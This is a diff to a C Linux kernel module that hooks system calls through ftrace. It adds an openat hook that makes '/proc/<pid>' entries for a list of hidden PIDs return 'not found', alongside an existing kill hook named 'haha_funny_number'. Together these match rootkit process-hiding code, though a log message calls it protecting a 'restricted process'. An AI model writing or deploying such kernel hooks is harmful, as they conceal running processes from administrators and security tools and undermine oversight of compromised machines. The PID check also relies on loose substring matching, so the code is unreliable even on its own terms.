@@ -1,9 +1,14 @@
 #include "ftrace_helper.h"
 #include <asm-generic/errno-base.h>
+#include <linux/dirent.h>
+#include <linux/fdtable.h>
 #include <linux/init.h>
 #include <linux/kallsyms.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
+#include <linux/proc_ns.h>
+#include <linux/slab.h>
+#include <linux/string.h>
 #include <linux/syscalls.h>
 #include <linux/version.h>
 
@@ -126,8 +131,43 @@ static asmlinkage int haha_funny_number(const struct pt_regs *regs) {
   return 0;
 }
 
+bool exists(char item[]) {
+
+  for (int i = 0; i < MAX_PIDS; i++) {
+    char str[64];
+    if (hidden_pids[i] != 0) {
+      sprintf(str, "/proc/%d", hidden_pids[i]);
+      if (strstr(item, str)) {
+        return true;
+      }
+    }
+  }
+  return false;
+}
+
+// hook into __x64_sys_openat
+static asmlinkage long (*orig_openat)(const struct pt_regs *);
+static int monitor_handle(const struct pt_regs *regs) {
+  const char __user *user_filename;
+  user_filename = (const char __user *)regs->si;
+  char filename[256];
+  long bytes;
+  bytes = strncpy_from_user(filename, user_filename, sizeof(filename) - 1);
+  user_filename = (const char __user *)regs->si;
+  if (bytes > 0) {
+    filename[bytes] = '\0';
+    if (exists(filename)) {
+      printk(KERN_INFO "process trying to access restricted process!\n");
+      return -ENOENT;
+    }
+    return orig_openat(regs);
+  }
+  return orig_openat(regs);
+}
+
 static struct ftrace_hook hooks[] = {
     HOOK("sys_kill", haha_funny_number, &orig_kill),
+    HOOK("sys_openat", monitor_handle, &orig_openat),
 };
 
 /* Module initialization function */
